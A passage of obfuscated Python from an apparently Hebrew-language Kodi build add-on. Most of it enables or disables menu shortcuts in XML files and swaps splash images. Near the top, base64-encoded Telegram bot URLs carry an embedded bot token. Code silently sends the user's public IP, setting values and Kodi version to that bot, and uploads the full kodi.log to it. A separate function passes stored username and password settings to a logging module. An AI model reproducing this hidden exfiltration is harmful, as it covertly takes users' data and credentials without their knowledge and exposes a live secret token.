          O0OOOO0O00OO00000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:573
          OO000O0000OO0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:575
          OOOO0000O0OO00OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:576
          O0O000O0OOOOO00OO =str (json .loads (OOOO0000O0OO00OO0 )['ip'])#line:577
          OOOO0OO0OO0OOOOOO =O0O0OO00O00OOO0OO #line:578
          OO00OO00OOOOO000O =OOO0OO0O0O0OOO0O0 #line:579
          import socket #line:581
          OOOO0000O0OO00OO0 =urllib2 .urlopen (OO000O0000OO0O0O0 .decode ('base64')+' - '+OOOO0OO0OO0OOOOOO +' - '+OO00OO00OOOOO000O +' - '+O0OOOO0O00OO00000 ).readlines ()#line:582
       except :pass #line:583
def googleindicat ():#line:586
			import logg #line:587
			OOO0O00OOOO0O000O =(ADDON .getSetting ("pass"))#line:588
			O0OOO000OOO0O0O0O =(ADDON .getSetting ("user"))#line:589
			logg .logGA (OOO0O00OOOO0O000O ,O0OOO000OOO0O0O0O )#line:590
def logsend ():#line:591
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:592
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:593
      howsentlog ()#line:595
      import requests #line:596
      if xbmc .getCondVisibility ('system.platform.windows'):#line:597
         OOOO0000O0OOO0OOO =xbmc .translatePath ('special://home/kodi.log')#line:598
         OOOO00O000O0000OO ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O0OOO0OOO ,open (OOOO0000O0OOO0OOO ,'rb')),}#line:602
         O00O0OO00OOO000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:603
         OOOOO00O00OO000OO =requests .post (O00O0OO00OOO000O0 .decode ('base64'),files =OOOO00O000O0000OO )#line:605
      elif xbmc .getCondVisibility ('system.platform.android'):#line:606
           OOOO0000O0OOO0OOO =xbmc .translatePath ('special://temp/kodi.log')#line:607
           OOOO00O000O0000OO ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O0OOO0OOO ,open (OOOO0000O0OOO0OOO ,'rb')),}#line:611
           O00O0OO00OOO000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:612
           OOOOO00O00OO000OO =requests .post (O00O0OO00OOO000O0 .decode ('base64'),files =OOOO00O000O0000OO )#line:614
      else :#line:615
           OOOO0000O0OOO0OOO =xbmc .translatePath ('special://kodi.log')#line:616
           OOOO00O000O0000OO ={'chat_id':(None ,'-274262389'),'document':(OOOO0000O0OOO0OOO ,open (OOOO0000O0OOO0OOO ,'rb')),}#line:620
           O00O0OO00OOO000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:621
           OOOOO00O00OO000OO =requests .post (O00O0OO00OOO000O0 .decode ('base64'),files =OOOO00O000O0000OO )#line:623
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:624
def rdoff ():#line:626
	O0000O000O0OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:657
	OOO00O0O0OOO00OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:658
	copyfile (O0000O000O0OO0OO0 ,OOO00O0O0OOO00OOO )#line:659
def skindialogsettind18 ():#line:660
	try :#line:661
		O00O00000O00OOO0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:662
		OOO0O0O0O0O000O0O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:663
		copyfile (O00O00000O00OOO0O ,OOO0O0O0O0O000O0O )#line:664
	except :pass #line:665
def rdon ():#line:666
	loginit .loginIt ('restore','all')#line:667
	O0OOO00O0O00O0O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:669
	OOOO00O00000OO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:670
	copyfile (O0OOO00O0O00O0O00 ,OOOO00O00000OO00O )#line:671
def adults18 ():#line:673
  O0000O0OO0OO0OO00 =(ADDON .getSetting ("adults"))#line:674
  if O0000O0OO0OO0OO00 =='true':#line:675
    OOO0000OO0OOO000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:676
    with open (OOO0000OO0OOO000O ,'r')as O0O00O0OOOOO0OOO0 :#line:677
      OOOOO0OO00O000O00 =O0O00O0OOOOO0OOO0 .read ()#line:678
    OOOOO0OO00O000O00 =OOOOO0OO00O000O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:696
    with open (OOO0000OO0OOO000O ,'w')as O0O00O0OOOOO0OOO0 :#line:699
      O0O00O0OOOOO0OOO0 .write (OOOOO0OO00O000O00 )#line:700
def rdbuildaddon ():#line:701
  O00OOO00O0O0O0OOO =(ADDON .getSetting ("auto_rd"))#line:702
  if O00OOO00O0O0O0OOO =='true':#line:703
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:704
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:705
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:706
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:724
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:727
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:728
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:732
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:733
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:734
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:752
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:755
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:756
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:760
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:761
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:762
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:780
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:783
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:784
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:788
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:789
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:790
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:808
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:811
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:812
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:815
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:816
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:817
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:835
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:838
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:839
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:841
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:842
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:843
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:861
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:864
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:865
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:867
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:868
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:869
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:887
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:890
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:891
    O0OOOOO0O0OO0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:894
    with open (O0OOOOO0O0OO0OO00 ,'r')as OOOO0O0OO0000O0O0 :#line:895
      O0O0OO0O0O0O00OO0 =OOOO0O0OO0000O0O0 .read ()#line:896
    O0O0OO0O0O0O00OO0 =O0O0OO0O0O0O00OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:914
    with open (O0OOOOO0O0OO0OO00 ,'w')as OOOO0O0OO0000O0O0 :#line:917
      OOOO0O0OO0000O0O0 .write (O0O0OO0O0O0O00OO0 )#line:918
def rdbuildinstall ():#line:921
  try :#line:922
   OOO0O0O0OO00O0OOO =(ADDON .getSetting ("auto_rd"))#line:923
   if OOO0O0O0OO00O0OOO =='true':#line:924
     O0OOO0O00O0OO000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:925
     OO0OO0O0O0OOOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:926
     copyfile (O0OOO0O00O0OO000O ,OO0OO0O0O0OOOOO0O )#line:927
  except :#line:928
     pass #line:929
def rdbuildaddonoff ():#line:932
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:935
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:936
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:937
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:955
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:958
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:959
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:963
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:964
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:965
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:983
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:986
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:987
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:991
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:992
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:993
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1011
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1014
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1015
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1019
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:1020
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:1021
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1039
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1042
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1043
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1046
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:1047
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:1048
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1066
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1069
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1070
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1072
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:1073
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:1074
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1092
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1095
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1096
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1098
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:1099
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:1100
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1118
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1121
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1122
    OOO000OOO00OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1125
    with open (OOO000OOO00OO0OO0 ,'r')as OOOO0OO0O0OO00O0O :#line:1126
      O00OOOOOOOOOO0O00 =OOOO0OO0O0OO00O0O .read ()#line:1127
    O00OOOOOOOOOO0O00 =O00OOOOOOOOOO0O00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1145
    with open (OOO000OOO00OO0OO0 ,'w')as OOOO0OO0O0OO00O0O :#line:1148
      OOOO0OO0O0OO00O0O .write (O00OOOOOOOOOO0O00 )#line:1149
def rdbuildinstalloff ():#line:1152
    try :#line:1153
       O0000OO0OOOO0OOO0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1154
       OOOOOOO00OO00O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1155
       copyfile (O0000OO0OOOO0OOO0 ,OOOOOOO00OO00O000 )#line:1157
       O0000OO0OOOO0OOO0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1159
       OOOOOOO00OO00O000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1160
       copyfile (O0000OO0OOOO0OOO0 ,OOOOOOO00OO00O000 )#line:1162
       O0000OO0OOOO0OOO0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1164
       OOOOOOO00OO00O000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1165
       copyfile (O0000OO0OOOO0OOO0 ,OOOOOOO00OO00O000 )#line:1167
       O0000OO0OOOO0OOO0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1170
       OOOOOOO00OO00O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1171
       copyfile (O0000OO0OOOO0OOO0 ,OOOOOOO00OO00O000 )#line:1173
    except :#line:1175
       pass #line:1176
def rdbuildaddonON ():#line:1183
    OOO000O000O0O0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1185
    with open (OOO000O000O0O0OOO ,'r')as O0OOOOOOOO00OOO00 :#line:1186
      OOO00000000000OOO =O0OOOOOOOO00OOO00 .read ()#line:1187
    OOO00000000000OOO =OOO00000000000OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
